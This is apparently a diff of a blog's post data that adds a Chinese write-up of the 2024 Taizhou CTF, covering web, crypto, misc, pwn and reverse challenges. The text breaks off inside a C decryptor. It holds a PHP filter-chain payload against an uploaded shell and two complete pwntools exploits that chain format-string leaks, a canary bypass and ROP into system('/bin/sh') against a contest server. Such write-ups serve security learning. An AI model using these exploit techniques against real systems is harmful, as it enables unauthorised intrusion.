-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/893acd65-17e9-48ab-9221-b84a454b27c0.png"
-                        alt="893acd65-17e9-48ab-9221-b84a454b27c0"
-                 ></p>
-<p>听flag即可</p>
 ]]></content>
       <categories>
         <category>题解</category>
@@ -1780,6 +1420,137 @@ hook密文，发现密文没有改变，那改变的可能是输入的flag数据
       </categories>
   </entry>
   <entry>
+    <title>2024 台州市赛 部分WriteUp</title>
+    <url>//post/2024tzctf/</url>
+    <content><![CDATA[<h2 id="Web">Web</h2>
+<h3 id="DEAD-OR-ALIVE">DEAD OR ALIVE</h3>
+<p>php死亡绕过 php伪协议 url二次编码绕过一下</p>
+<p>这里开启了短tag rot47绕不过去</p>
+<p>换成</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=upload/shell.php</span><br><span class="line">contents=?%3Chp%20phpipfn(o;)%3E?</span><br></pre></td></tr></table></figure>
+<p>得到flag</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016122520194.png"
+                        alt="image-20241016122520194"
+                 ></p>
+<h3 id="几道菜呀">几道菜呀</h3>
+<p>robotstxt 泄露前半flag</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016122520194.png"
+                        alt="image-20241016122938977"
+                 ></p>
+<p>后半flag变量覆盖 吧flag污染到变量world里面</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016123059656.png"
+                        alt="image-20241016123059656"
+                 ></p>
+<h3 id="Crypto">Crypto</h3>
+<h4 id="codemaster">codemaster</h4>
+<p>爆破得到压缩包密码</p>
+<p>hint里面看到压缩包密码</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016123701666.png"
+                        alt="image-20241016123701666"
+                 ></p>
+<p>听出来摩斯编码</p>
+<p>01 0100 0100 011 111 010 101 01 10 100 10 111 0110 0100 01 1011 11 01 101 0 0111 01 1010 101 01 100</p>
+<p>001 0100 0100 1000解码得到压缩包密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALLWORKANDNOPLAYMAKEJACKADULLBOY</span><br></pre></td></tr></table></figure>
+<p>得到flag</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016124350133.png"
+                        alt="image-20241016124350133"
+                 ></p>
+<h4 id="简单的模运算">简单的模运算</h4>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n1 =  <span class="number">59291291447490366931525634934604732490686993375526804349191888372804657968568621876626267171031639542229776816809231575682674990669907844507573323062869697381007018170369953528533225693260962158277876389797698421883811693774623191453338343873376809325940622690724742325375260783954612111771505452790833107433</span></span><br><span class="line">e1 =  <span class="number">1009</span></span><br><span class="line">e2 =  <span class="number">661</span></span><br><span class="line">c1 =  <span class="number">42985353077188042701858678659683858628193880095538312019081971299029326751867795460043384534976482867850898695817341887974850615883707385265375936859975562647458644154098813749248370155445911231152202411316142174083125556302740642264129017638217154099365335103116579136478977445028803457714891387414804454563</span></span><br><span class="line">hint2 =  <span class="number">40507463249661310357827794806044375677878316124571340628557074423085821966799760539750240709046644351970536177027127843527257097695964926292300842488261880439240179761636200128317742727421272586463218228015921971356760958631902559531017704907319793768862467740343002694370348402368271531907359292269313167594</span></span><br><span class="line">hint1 =  <span class="number">1271005879853316066661199285969179445258555468409602536767308127422453124456569166278548456389424001236622134198431700958874184560969387121822195176467698604581027381830540104701755158555395105056691597754287953054854072522855420859550987917092786677237411037800799757596145745139003994853090852244952501770</span></span><br><span class="line"></span><br><span class="line">p=GCD(n1, hint1**e1-e1**(e1*e2)*hint2**e2)</span><br><span class="line"></span><br><span class="line">m=<span class="built_in">pow</span>(c1, inverse(<span class="number">65537</span>, p-<span class="number">1</span>),p)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n2 =  <span class="number">18907964900655384324579822409386633636878766956056871585535362235214353767231073564264059287914388330411792102199606677008933621408085966756951588469677351070820733406746369679198435269992553170199992317543151904463295431360000467944654613563212110648427484740736780335622922770497302516605477200091994280170659051797483082932715112295285374951466772664058673174457133774539371864037823431076085535646866492867565053211399132137624309571702027870497719709848105717638061824558263209029252939242634210549580025431343041421766587111257036497372428545483704784943228958032869014014563237034417269447643411742587366522581092247139356905151503074118950953726319892565456479517718514001822091970116274032235077283171573739409327260871369017093426482435098823654221146125974831336950435699141428482689352594911360748437075413924102074118643817682988301168832491421799525827632647293700871699768251822202064478207264310344710162587091114198326722398521534722836191900118919600325987668228334387274131745452370144048469165896152934265086085786170745300044244328435656038364921390878141315764940004361350568616343868964642155971232793094529961537868556317288317761237430569785361173933724010332338240102029231307867651913780873895463922404696220328907265969090667253011075715302423364798124784791540343259221981176571491275777227356362593241763735078774750032170810209648159443012857333801615838630780060716065099646497273032317098446052746729617067928763959393487041510168193671378036773409927475705441371588922269531683087325413686315760604906941830110671649667896262119795185372459800672732201403353796496975239081396680894282951703497436899157694531797901273547022181574313676236049710129802224469486290831758140772148263506850711301689866687921384434558768919627058698246307704127709329632785782812326088967419473252484748677712381933762265715476433475653</span></span><br><span class="line">hint3 =  <span class="number">9939018467626296300864549557153960485816202060115441771858993139956001568094397129213688325169848929397519454556265038265085753791012239390847499832076142790537570688728474176390891119329028306138917962137940523721411683756694953004757356322832322272044727574511946615053360780724964403109981221038321150251912087095566788471973368735984926133539004913163814796547521685779553548417828006578689568287135076606657942555780079060666398892624634539284576783451146414121481315811210373744629102035041262128288541384833388244359092650525684510233998198648220188818529696044589322103131713532522087913277853687802387823370812184861308056607206704924142111163623647400386387795315156552323415775302567837608141240660791558895222250523472575523943334805729177781503647940132538364353380916295244903544529895988952519161034077133368918033027698840291604695794239996491625350827193007237672555853711676946280455422865857083520387962904612732978811244632662722516874510663815000407442709650546583427701935634421822920667340400344464560819496241832753100346158973730178944583819434570015364985334123682718945396012714833234814138060680879946683598382558581755464432848629830671740874556822495651590292355132309556201503702994218748824342270746121842337819752324099307642066174745872761074064496053960340396957873940843698476902239785513353538575271300199803656708789414583304212919858466476111752009816249691548012011325635726932007337584928654763601504911235883280784689919453164650180423494792012285026508211938647974660637499188015435581876228505538395991613265963363970634342709084117396030961729066498695271401095219781344237736883159601430790828530656828799412179649742014177933116928065839153385688599329261957525423958781720021524864279277040500534782586037303978447982579881703150864520067784227584088469267877647284326147128663307302461696049106379396</span></span><br><span class="line">hint4 =  <span class="number">11497927853957540365332790665731275206952151206861039571536392062632509295957449992678521695139160324432572043863866571073273424766195027066994928026020365890447586873438730677930838694248463784234422970896904779315141100899548415386962349420861970235250438845409060098489028828677789310690303276268227293420117427555062211347687022376226002772552572846005575907377875069559346178573605837280707896716903996273437999304784804469148200034055401729899984732371826562249893238400736560876412526076698397150716407768045925783960626076975474775287357623238930181817744888057241082587725853888247069373763616410186825446631363893872367121719099675878971215427631753890480342562281509217650841316549477101278836516712239644946591434882047908159355119724740895836970093220436696609508084144405957119864577550601265078506824881563233145601502789276574964256487656042156050790935757687533400014492738943377035151940053902285169162559415884261670006407914345470020985548114750984409094762491065523701667910143102554492295526746294891248183460488516919232107982441935261002056298051839186448002917036315086702724337403007094283544108605752353892969499338937456927473502637574082273446631592875576206457590873417790534425052375523311069970894661662935504029122498888677579838832589434264156033809784824308541883139057067073172969579383284214906496081973100504512465134008311849499410830926217663692810810073433508445528894019031624950077917834721653995486872359322444973369269957808220204120434820049177595069822767774880891475045042506316778272385296785381694201967451988353025446019210309412684814041807087081841227290094176745748423008005181412793105824372881451510867905760386180468940263583834371726883151840358399349831450242497969453799407724511831157375792268531837507107779497339624673256413930993867285692700231244480782493119378673295412687014852050209</span></span><br><span class="line">hint5 =  <span class="number">734693499178140709107482184121639881311481497449164451247514670640712514605734040224535011153519609835276802031782238154113623838563165860055971999265801692161249909520059287311664417036724025637099701450424590923727907132999019020950844342934742235333060614209179570928227493575110697506644022234765949969346518432653798426853947974772328105759741384608693269694</span></span><br><span class="line"></span><br><span class="line">q2=GCD(n2, hint3-hint4)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(q2)</span><br><span class="line">p2q2=GCD(n2,hint4-q2-hint3)</span><br><span class="line">r=n2//p2q2</span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes((hint5-<span class="number">1</span>)//r**<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># DASCTF&#123;0e88f0e0-f18d-11ee-a56a-38f3abddb69b&#125;</span></span><br></pre></td></tr></table></figure>
+<h3 id="Misc">Misc</h3>
+<h4 id="大ping特ping">大ping特ping</h4>
+<p>CTF-NetA一把梭</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016112455975.png"
+                        alt="image-20241016112455975"
+                 ></p>
+<h4 id="鼠标不妙题">鼠标不妙题</h4>
+<p>打开后是300个套娃压缩包，写脚本提取</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_all</span>(<span class="params">zip_path, extract_to, root_directory</span>):</span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(zip_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_ref:</span><br><span class="line">        <span class="keyword">for</span> member <span class="keyword">in</span> zip_ref.namelist():</span><br><span class="line">            filename = os.path.basename(member)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> filename:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            source = zip_ref.<span class="built_in">open</span>(member)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                target_path = os.path.join(extract_to, <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&quot;_&quot;</span> + filename)</span><br><span class="line">                <span class="keyword">with</span> source, <span class="built_in">open</span>(target_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> target:</span><br><span class="line">                    shutil.copyfileobj(source, target)</span><br><span class="line">            <span class="keyword">except</span> RuntimeError:</span><br><span class="line">                <span class="comment"># 如果文件被加密，则将其保存到根目录下</span></span><br><span class="line">                target_path = os.path.join(root_directory, <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&quot;_&quot;</span> + filename)</span><br><span class="line">                <span class="keyword">with</span> source, <span class="built_in">open</span>(target_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> target:</span><br><span class="line">                    shutil.copyfileobj(source, target)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recursive_unzip</span>(<span class="params">directory, root_directory</span>):</span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(directory):</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">            <span class="keyword">if</span> file.endswith(<span class="string">&#x27;.zip&#x27;</span>) <span class="keyword">and</span> <span class="keyword">not</span> file.endswith(<span class="string">&#x27;.dic&#x27;</span>):</span><br><span class="line">                file_path = os.path.join(root, file)</span><br><span class="line">                extract_to = os.path.join(root, os.path.splitext(file)[<span class="number">0</span>])</span><br><span class="line">                os.makedirs(extract_to, exist_ok=<span class="literal">True</span>)</span><br><span class="line">                extract_all(file_path, extract_to, root_directory)</span><br><span class="line">                recursive_unzip(extract_to, root_directory)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    start_directory = <span class="string">r&quot;\\?\C:\Users\67300\Downloads\11&quot;</span></span><br><span class="line">    recursive_unzip(start_directory, start_directory)</span><br></pre></td></tr></table></figure>
+<p>查看python的报错信息和使用everything直接得到最内层的文件</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016121031728.png"
+                        alt="image-20241016121031728"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016121119612.png"
+                        alt="image-20241016121119612"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016121223773.png"
+                        alt="image-20241016121223773"
+                 ></p>
+<p>每个压缩包下有一个.dic文件，应该密码就在这300个字典中</p>
+<p>写python脚本提取这300个字典</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_zip</span>(<span class="params">zip_path, output_dir</span>):</span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(zip_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_ref:</span><br><span class="line">        <span class="keyword">with</span> tempfile.TemporaryDirectory() <span class="keyword">as</span> temp_dir:</span><br><span class="line">            zip_ref.extractall(temp_dir)</span><br><span class="line">            <span class="keyword">for</span> root, _, files <span class="keyword">in</span> os.walk(temp_dir):</span><br><span class="line">                <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">                    file_path = os.path.join(root, file)</span><br><span class="line">                    <span class="keyword">if</span> file.endswith(<span class="string">&#x27;.zip&#x27;</span>):</span><br><span class="line">                        extract_zip(file_path, output_dir)</span><br><span class="line">                    <span class="keyword">elif</span> file.endswith(<span class="string">&#x27;.dic&#x27;</span>):</span><br><span class="line">                        shutil.move(file_path, os.path.join(output_dir, file))</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&#x27;Extracted <span class="subst">&#123;file&#125;</span> to <span class="subst">&#123;output_dir&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            shutil.rmtree(temp_dir)</span><br><span class="line"></span><br><span class="line">zip_dir = <span class="string">&#x27;C:/Users/67300/Downloads/鼠标不妙题/&#x27;</span></span><br><span class="line">output_dir = <span class="string">&#x27;C:/Users/67300/Downloads/鼠标不妙题/111&#x27;</span></span><br><span class="line"></span><br><span class="line">os.makedirs(output_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(zip_dir):</span><br><span class="line">    <span class="keyword">if</span> filename.endswith(<span class="string">&#x27;.zip&#x27;</span>):</span><br><span class="line">        zip_path = os.path.join(zip_dir, filename)</span><br><span class="line">        extract_zip(zip_path, output_dir)</span><br><span class="line">    <span class="keyword">if</span> filename.endswith(<span class="string">&#x27;.zip&#x27;</span>):</span><br><span class="line">        zip_path = os.path.join(zip_dir, filename)</span><br><span class="line">        extract_zip(zip_path, output_dir)</span><br></pre></td></tr></table></figure>
+<p>将300个字典合并成1个，然后跑字典爆破密码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">output_dir = <span class="string">&#x27;C:/Users/67300/Downloads/鼠标不妙题/111&#x27;</span></span><br><span class="line">combined_file_path = <span class="string">&#x27;C:/Users/67300/Downloads/鼠标不妙题/combined.dic&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(combined_file_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> combined_file:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(output_dir):</span><br><span class="line">        <span class="keyword">if</span> filename.endswith(<span class="string">&#x27;.dic&#x27;</span>):</span><br><span class="line">            dic_file_path = os.path.join(output_dir, filename)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(dic_file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> dic_file:</span><br><span class="line">                content = dic_file.read()</span><br><span class="line">                combined_file.write(content)</span><br><span class="line">                combined_file.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;All .dic files have been combined into <span class="subst">&#123;combined_file_path&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="C:/Users/67300/AppData/Roaming/Typora/typora-user-images/image-20241016113045440.png"
+                        alt="image-20241016113045440"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016113315654.png"
+                        alt="image-20241016113315654"
+                 ></p>
+<p>看了一下f_几就嵌套几层，可以直接用everything一把梭，找到文件，每个文件是base64的一段</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016113621322.png"
+                        alt="image-20241016113621322"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016113824170.png"
+                        alt="image-20241016113824170"
+                 ></p>
+<h3 id="Pwn">Pwn</h3>
+<h4 id="book">book</h4>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, timeout = <span class="number">5</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">binary = <span class="string">&#x27;./book&#x27;</span></span><br><span class="line">elf = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    libc = elf.libc</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">    host = <span class="string">&#x27;139.155.126.78&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;31248&#x27;</span></span><br><span class="line">    p = remote(host,port)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data:     p.sendlineafter(delim, data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> delim, data:     p.sendafter(delim, data)</span><br><span class="line">s   = <span class="keyword">lambda</span> data:            p.send(data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data:            p.sendline(data)</span><br><span class="line">ru  = <span class="keyword">lambda</span> delim, **kwargs: p.recvuntil(delim, **kwargs)</span><br><span class="line">io  = <span class="keyword">lambda</span>:                 p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt</span>(<span class="params">payload</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sa(<span class="string">b&quot;name:\n&quot;</span>, payload)</span><br><span class="line">    ru(<span class="string">b&quot;name is:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">payload</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    ru(<span class="string">b&quot;write\n&quot;</span>)</span><br><span class="line">    s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    fmt(<span class="string">&quot;%8$p-%19$p-%13$p&quot;</span>)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">    codebase = <span class="built_in">int</span>(p.recvn(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x14a0</span></span><br><span class="line">    ru(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">    libc.address = <span class="built_in">int</span>(p.recvn(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x24083</span></span><br><span class="line">    ru(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">    canary = <span class="built_in">int</span>(p.recvn(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    system = libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    binsh = <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">    success(<span class="string">f&quot;libc: <span class="subst">&#123;libc.address:#x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    b = codebase + <span class="number">0x4068</span></span><br><span class="line">    pop_rdi_ret = codebase + <span class="number">0x0000000000001503</span></span><br><span class="line">    ret = pop_rdi_ret + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    pay = fmtstr_payload(<span class="number">6</span>, &#123;b : <span class="number">0x200</span>&#125;)</span><br><span class="line">    fmt(pay)</span><br><span class="line"></span><br><span class="line">    pay = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(canary) + p64(<span class="number">0</span>) + p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system) </span><br><span class="line">    attack(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    io()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
+<h4 id="magic-fmt">magic_fmt</h4>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, timeout = <span class="number">5</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">binary = <span class="string">&#x27;./magic_fmt&#x27;</span></span><br><span class="line">elf = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    libc = elf.libc</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">    host = <span class="string">&#x27;139.155.126.78&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;37023&#x27;</span></span><br><span class="line">    p = remote(host,port)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data:     p.sendlineafter(delim, data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> delim, data:     p.sendafter(delim, data)</span><br><span class="line">s   = <span class="keyword">lambda</span> data:            p.send(data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data:            p.sendline(data)</span><br><span class="line">ru  = <span class="keyword">lambda</span> delim, **kwargs: p.recvuntil(delim, **kwargs)</span><br><span class="line">io  = <span class="keyword">lambda</span>:                 p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    ru(<span class="string">b&quot;possess\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    pay = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe0</span></span><br><span class="line">    s(pay)</span><br><span class="line">    ru(<span class="string">b&quot;can &quot;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe0</span>)</span><br><span class="line"></span><br><span class="line">    ret_addr = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) + <span class="number">0x8</span></span><br><span class="line">    success(<span class="string">f&quot;ret: <span class="subst">&#123;ret_addr:#x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&quot;else?\n&quot;</span>)</span><br><span class="line">    pay = p64(ret_addr)</span><br><span class="line"></span><br><span class="line">    s(pay)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&quot;have?\n&quot;</span>)</span><br><span class="line">    pay = <span class="string">f&quot;%45$p%<span class="subst">&#123;<span class="number">0x68</span>-<span class="number">14</span>&#125;</span>c%6$hhn&quot;</span>.encode()</span><br><span class="line">    s(pay)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&quot;magic:\n&quot;</span>)</span><br><span class="line">    ru(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">    libc.address = <span class="built_in">int</span>(p.recvn(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x29d90</span></span><br><span class="line">    pop_rdi_ret = libc.address + <span class="number">0x000000000002a3e5</span></span><br><span class="line">    ret = pop_rdi_ret + <span class="number">1</span></span><br><span class="line">    system = libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    binsh = <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">    success(<span class="string">f&quot;libc: <span class="subst">&#123;libc.address:#x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    rsp = ret_addr - <span class="number">0x118</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&quot;possess\n&quot;</span>)</span><br><span class="line">    pay = p64(ret_addr) + fit(ret, pop_rdi_ret, binsh, system)</span><br><span class="line">    s(pay)</span><br><span class="line"></span><br><span class="line">    sa(<span class="string">b&quot;else?&quot;</span>, pay)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&quot;have?\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    rbp_offset = <span class="number">34</span></span><br><span class="line"></span><br><span class="line">    pay = <span class="string">f&quot;%<span class="subst">&#123;<span class="number">0x8B</span>&#125;</span>c%6$hhn%<span class="subst">&#123;(rsp&amp;<span class="number">0xffff</span>) - <span class="number">0x8b</span>&#125;</span>c%<span class="subst">&#123;rbp_offset&#125;</span>$hn&quot;</span>.encode()</span><br><span class="line">    <span class="comment"># gdb.attach(p, &quot;bbase 0x1327&quot;)</span></span><br><span class="line">    s(pay)</span><br><span class="line"></span><br><span class="line">    io()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
+<h3 id="Reverse">Reverse</h3>
+<h4 id="easy-choice">easy_choice</h4>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> delta 0x9e3779b9</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> w[<span class="number">8</span>] = &#123;<span class="number">0xAC3A28FD</span>, <span class="number">0x2331590C</span>, <span class="number">0x329F681B</span>, <span class="number">0xA6CF62DB</span>, <span class="number">0x8738A413</span>, <span class="number">0x44D27414</span>, <span class="number">0xDEF3A4CD</span>, <span class="number">0x5B22BA91</span>&#125;;<span class="comment">//可改</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> v[<span class="number">2</span>];</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>] = &#123;<span class="number">0x41</span>,<span class="number">0x53</span>,<span class="number">0x43</span>,<span class="number">0x54</span>&#125;;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> sum;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> y,z,p,rounds,e;</span><br><span class="line">	<span class="type">int</span> n = <span class="number">2</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> key2[<span class="number">4</span>]=&#123;<span class="number">0x54</span>,<span class="number">0x4f</span>,<span class="number">0x44</span>,<span class="number">0x41</span>&#125;;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> o=<span class="number">0</span>;o&lt;<span class="number">4</span>;o++)</span><br><span class="line">	&#123;	</span><br><span class="line">		rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">		v[<span class="number">0</span>]=w[<span class="number">2</span>*o];</span><br><span class="line">		v[<span class="number">1</span>]=w[<span class="number">2</span>*o+<span class="number">1</span>];</span><br><span class="line">		sum = rounds*delta;</span><br><span class="line">		y = v[<span class="number">0</span>];</span><br><span class="line">		<span class="keyword">do</span></span><br><span class="line">		&#123;</span><br><span class="line">			e = sum &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span>;</span><br><span class="line">			<span class="keyword">for</span>(p=n<span 